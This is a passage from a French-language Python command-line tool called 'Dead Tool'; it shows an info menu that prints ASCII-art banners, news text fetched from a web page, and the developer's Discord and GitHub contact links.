            input(important + "Appuie pour quitter...")
elif start == '5':
    news = deadinfo()
    if news == '1':
        os.system("cls")
        info = requests.get("https://dead-tool.glitch.me/news.html").text
        print("""
▓█████▄ ▓█████ ▄▄▄      ▓█████▄     ███▄    █ ▓█████  █     █░  ██████ 
▒██▀ ██▌▓█   ▀▒████▄    ▒██▀ ██▌    ██ ▀█   █ ▓█   ▀ ▓█░ █ ░█░▒██    ▒ 
░██   █▌▒███  ▒██  ▀█▄  ░██   █▌   ▓██  ▀█ ██▒▒███   ▒█░ █ ░█ ░ ▓██▄   
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌   ▓██▒  ▐▌██▒▒▓█  ▄ ░█░ █ ░█   ▒   ██▒
░▒████▓ ░▒████▒▓█   ▓██▒░▒████▓    ▒██░   ▓██░░▒████▒░░██▒██▓ ▒██████▒▒
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒    ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▓░▒ ▒  ▒ ▒▓▒ ▒ ░
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒    ░ ░░   ░ ▒░ ░ ░  ░  ▒ ░ ░  ░ ░▒  ░ ░
 ░ ░  ░    ░    ░   ▒    ░ ░  ░       ░   ░ ░    ░     ░   ░  ░  ░  ░  
   ░       ░  ░     ░  ░   ░                ░    ░  ░    ░          ░  devlopped by Ako
 ░                       ░   
                                                         
              """)   
        print(valide + "Les news du tool : ")
        print(info)
        input()
        input(important + "Appuie pour quitter...")
        
    elif news == '2':
        os.system("cls")
        print("""
▓█████▄ ▓█████ ▄▄▄      ▓█████▄    ▓█████▄  ██▓  ██████  ▄████▄   ▒█████   ██▀███  ▓█████▄ 
▒██▀ ██▌▓█   ▀▒████▄    ▒██▀ ██▌   ▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▒██▀ ██▌
░██   █▌▒███  ▒██  ▀█▄  ░██   █▌   ░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒░██   █▌
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌   ░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ░▓█▄   ▌
░▒████▓ ░▒████▒▓█   ▓██▒░▒████▓    ░▒████▓ ░██░▒██████▒▒▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░▒████▓ 
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒     ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒▓  ▒ 
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒     ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░ ░ ▒  ▒ 
 ░ ░  ░    ░    ░   ▒    ░ ░  ░     ░ ░  ░  ▒ ░░  ░  ░  ░        ░ ░ ░ ▒    ░░   ░  ░ ░  ░ 
   ░       ░  ░     ░  ░   ░          ░     ░        ░  ░ ░          ░ ░     ░        ░    
 ░                       ░          ░                   ░                           ░      devlopped by Ako
       
              """)
        print(wait + "Serveur support : https://discord.gg/gFkwb4F673")
        input()
        input(important + "Appuie pour quitter...")
    elif news == '3':
        os.system("cls")
        print("""
▓█████▄ ▓█████ ▄▄▄      ▓█████▄    ▓█████▄ ▓█████ ██▒   █▓
▒██▀ ██▌▓█   ▀▒████▄    ▒██▀ ██▌   ▒██▀ ██▌▓█   ▀▓██░   █▒
░██   █▌▒███  ▒██  ▀█▄  ░██   █▌   ░██   █▌▒███   ▓██  █▒░
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌   ░▓█▄   ▌▒▓█  ▄  ▒██ █░░
░▒████▓ ░▒████▒▓█   ▓██▒░▒████▓    ░▒████▓ ░▒████▒  ▒▀█░  
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒     ▒▒▓  ▒ ░░ ▒░ ░  ░ ▐░  
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒     ░ ▒  ▒  ░ ░  ░  ░ ░░  
 ░ ░  ░    ░    ░   ▒    ░ ░  ░     ░ ░  ░    ░       ░░  
   ░       ░  ░     ░  ░   ░          ░       ░  ░     ░  
 ░                       ░          ░                 ░   devlopped by Ako    
 
              """)
        projet = requests.get("https://dead-tool.glitch.me/projet.html").text
        print(wait + "Discord Tag : >Ako’#7882")
        print(wait + "Seveur Discord : https://discord.gg/gFkwb4F673")
        print(wait + "Github : https://github.com/Ako-fr")
        print(wait + "Projet : " + projet)
        input()
        input(important + "Appuie pour quitter...")